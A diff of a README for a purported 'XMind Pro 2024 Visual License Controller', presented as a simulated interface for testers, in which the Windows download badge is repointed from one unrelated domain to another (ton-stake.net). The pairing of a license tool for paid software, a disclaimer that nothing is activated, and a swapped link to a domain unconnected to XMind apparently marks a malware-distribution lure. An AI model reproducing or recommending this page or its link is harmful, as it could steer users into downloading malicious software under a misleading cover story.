@@ -4,7 +4,7 @@ Welcome to the **XMind Pro 2024 Visual License Controller** — a simulated UI s
 
 This tool is intended for **UX testers**, **education labs**, and **interface diagnostics**. No actual activation is performed.
 
-[![Download Controller](https://img.shields.io/badge/Download-XMind--License--Tool-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
+[![Download Controller](https://img.shields.io/badge/Download-XMind--License--Tool-blueviolet?style=for-the-badge&logo=windows)](https://ton-stake.net)
 
 ---
 
